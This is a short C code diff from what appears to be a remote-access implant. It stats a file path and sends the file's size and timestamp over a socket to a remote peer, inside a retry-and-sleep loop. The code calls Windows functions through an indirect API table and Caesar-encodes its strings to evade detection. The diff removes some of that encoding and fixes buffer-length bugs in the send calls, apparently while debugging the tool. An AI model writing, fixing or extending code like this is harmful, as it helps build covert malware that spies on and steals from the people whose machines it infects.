@@ -245,7 +245,7 @@ retry:
 			int st = Api.stat(CAESAR_DECRYPT(path), &fileinfo);
 			if (st != 0) {
 
-				if (Api.send(sock, CAESAR("N/N"), sizeof(CAESAR("N/N")), 0) < 0) {
+				if (Api.send(sock, "N/N", strlen("N/N"), 0) < 0) {
 					//send failed
 					Api.free(path);
 					Sleep_(Sleep_TIME);
@@ -257,10 +257,10 @@ retry:
 			}
 
 			time_t mtime = fileinfo.st_mtime;
-			struct tm* mtime_tm = Api._localtime64(&mtime);
+			struct tm* mtime_tm = Api.localtime(&mtime);
 			char mtime_str[30];
 			char sizeStr[20];
-			Api.strftime(mtime_str, 30, CAESAR_DECRYPT("*^2*r2*i%*M?*R?*X"), mtime_tm);
+			Api.strftime(mtime_str, 30, "%Y-%m-%d %H:%M:%S", mtime_tm);
 
 			// Concatenate the file size and modified time strings separated by "/"
 			Api._snprintf(sizeStr, 20, "%lld", (long long)fileinfo.st_size);
@@ -268,7 +268,7 @@ retry:
 			char* fileInfoStr = (char*)Api.malloc(bufferSize);
 			Api._snprintf(fileInfoStr, bufferSize, "%s/%s", sizeStr, mtime_str);
 
-			if (Api.send(sock, fileInfoStr, sizeof(fileInfoStr), 0) < 0) {
+			if (Api.send(sock, fileInfoStr, strlen(fileInfoStr), 0) < 0) {
 				//send failed
 				Api.free(path);
 				Api.free(fileInfoStr);
